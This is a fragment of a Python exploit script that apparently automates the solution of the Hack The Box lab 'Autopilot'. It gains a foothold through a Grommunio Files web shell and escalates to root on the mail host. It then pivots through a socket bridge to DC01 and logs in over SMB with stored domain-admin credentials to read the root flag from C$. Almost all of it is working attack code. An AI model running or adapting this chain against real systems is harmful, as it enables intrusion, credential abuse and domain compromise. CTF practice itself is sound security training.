            remote.settimeout(None)

            def accept_and_pump() -> None:
                try:
                    local, _ = front.accept()
                except OSError:
                    stopped.set()
                    return
                assert remote is not None
                _pump(local, remote, stopped)

            bridge_thread = threading.Thread(target=accept_and_pump, daemon=True)
            bridge_thread.start()

            port = front.getsockname()[1]
            smb = SMBConnection("DC01", "127.0.0.1", sess_port=port, timeout=20)
            try:
                smb.login(DA_USER, DA_PASSWORD, DOMAIN)
                contents = bytearray()
                smb.getFile("C$", ROOT_PATH, contents.extend)
                result = contents.decode("utf-8", "replace").strip()
                if not result:
                    raise RuntimeError("DC root.txt was empty")
                return result
            finally:
                try:
                    smb.logoff()
                except Exception:
                    pass
        finally:
            stopped.set()
            try:
                front.close()
            except OSError:
                pass
            if remote is not None:
                try:
                    remote.close()
                except OSError:
                    pass
            try:
                callback.close()
            except OSError:
                pass
            if bridge_thread is not None:
                bridge_thread.join(timeout=2)
            if unit is not None:
                try:
                    self.root_exec(
                        "/usr/bin/setpriv --reuid=0 --regid=0 --clear-groups "
                        f"/usr/bin/systemctl stop {shlex.quote(unit)} 2>/dev/null || true"
                    )
                except Exception:
                    pass



def flag_from(output: str, label: str) -> str:
    match = re.search(r"(?<![0-9a-f])[0-9a-f]{32}(?![0-9a-f])", output)
    if not match:
        raise RuntimeError(f"{label} flag not found in target output: {output[:240]!r}")
    return match.group(0)


def solve(ip: str) -> tuple[str, str]:
    foothold = Foothold(ip)
    escalator = RootEscalator(foothold.rce, ip)
    foothold_ready = False
    try:
        print("[1/4] Establishing Grommunio Files foothold...", flush=True)
        foothold.setup()
        foothold_ready = True
        print("[2/4] Escalating on the mail host...", flush=True)
        escalator.run()
        user_flag = flag_from(escalator.root("cat /root/user.txt"), "user")
        print("[3/4] Reaching DC01 through the mail host...", flush=True)
        root_flag = flag_from(DCPivot(escalator.root, ip).read_root_flag(), "root")
        print("[4/4] Flags recovered; restoring temporary changes...", flush=True)
        return user_flag, root_flag
    finally:
        try:
            escalator.cleanup()
        finally:
            if foothold_ready or foothold.account_id or foothold._uploaded:
                foothold.cleanup(delete_web_shell=True)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("ip", help="current external IPv4 address of HTB Autopilot")
    parser.add_argument("--verbose", action="store_true", help="show detailed progress")
    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
    if args.verbose:
        logging.getLogger(__name__).setLevel(logging.DEBUG)
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    import requests
    requests.packages.urllib3.disable_warnings()
    try:
        user_flag, root_flag = solve(args.ip)
    except Exception as exc:
        logging.error("Autopilot solve failed: %s", exc)
        if args.verbose:
            logging.exception("Traceback")
        return 1
    print("USER FLAG:", user_flag)
    print("ROOT FLAG:", root_flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
